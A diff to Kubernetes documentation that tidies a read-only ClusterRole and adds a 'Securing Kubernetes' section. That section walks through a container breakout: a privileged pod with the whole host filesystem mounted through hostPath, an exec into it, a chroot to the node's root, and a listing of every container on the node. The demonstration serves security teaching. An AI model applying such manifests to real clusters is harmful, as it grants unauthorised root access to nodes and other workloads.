@@ -110,6 +110,7 @@ subjects:
 
 Similarly the following ClusterRole / ClusterRolebinding gives the user, infra-monitor, rights to view and list resources across the cluster but no edit or write privileges.
 
+
 ```sh
 ---
 apiVersion: rbac.authorization.k8s.io/v1
@@ -117,13 +118,9 @@ kind: ClusterRole
 metadata:
   name: infra-monitor
 rules:
-- apiGroups:
-  - ""
-  resources: ["*"]
-  verbs:
-  - get
-  - list
-  - watch
+- apiGroups: [""] # "" indicates the core API group
+  resources: ["*"] # "*" applies to all resourc types 
+  verbs: ["get", "list", "watch"]
 ---
 apiVersion: rbac.authorization.k8s.io/v1
 kind: ClusterRoleBinding
@@ -241,4 +238,65 @@ spec:
   selector:
     matchLabels:
       app: frontend
+```
+
+## Securing Kubernetes
+
+The term “Container Breakout” refers to the event where a malicious or legitimate user is able to escape the container isolation and access resources (e.g. filesystem, processes, network interfaces) on the host machine.
+
+The following demonstrates where it is possible to abuse *hostpath* to gain root access to the underlying Kubernetes node.
+
+Apply the following to a namespace in the cluster:
+
+```sh
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    run: attacker-pod
+  name: attacker-pod
+  namespace: test
+spec:
+  hostPID: true
+  hostIPC: true
+  hostNetwork: true
+  volumes:
+  - name: host-fs
+    hostPath:
+      path: /
+  containers:
+  - image: ubuntu
+    name: attacker-pod
+    command: ["/bin/sh", "-c", "sleep infinity"]
+    securityContext:
+      privileged: true
+      allowPrivilegeEscalation: true
+    volumeMounts:
+    - name: host-fs
+      mountPath: /host
+  restartPolicy: Never
+```
+Next, exec into the container:
+
+```sh
+kubectl exec -it attacker-pod -n test -- bash
+root@workload-worker-nodepool-a1-m2r7d-847d79df59-69v67:/#
+```
+
+Next we_chroot_ our process to the Node’s root filesystem accessible to us in _/host_ directory due to _hostPath_ volume mount.
+
+```sh
+root@workload-worker-nodepool-a1-m2r7d-847d79df59-69v67:/# chroot /host/ bash
+root [ / ]#
+```
+
+At this point we can access all  Containers running in the node irrespective of which Pod or Namespace they belong to.
+
+```sh
+root [ / ]# crictl ps
+CONTAINER           IMAGE               CREATED             STATE               NAME                               ATTEMPT             POD ID
+67a1e02b051d9       88736fe827391       7 hours ago         Running             nginx                              0                   58187e661b0ec
+c20e23877b741       a8780b506fa4e       7 hours ago         Running             attacker-pod                       0                   66ff16a536375
+0a6e4a5510c6c       d8c2bca7c9ec1       8 hours ago         Running             rabbitmq                           0                   91cf266cf5623
+1d333f889f709       88736fe827391       8 hours ago         Running             nginx                              0                   0750d1
 ```
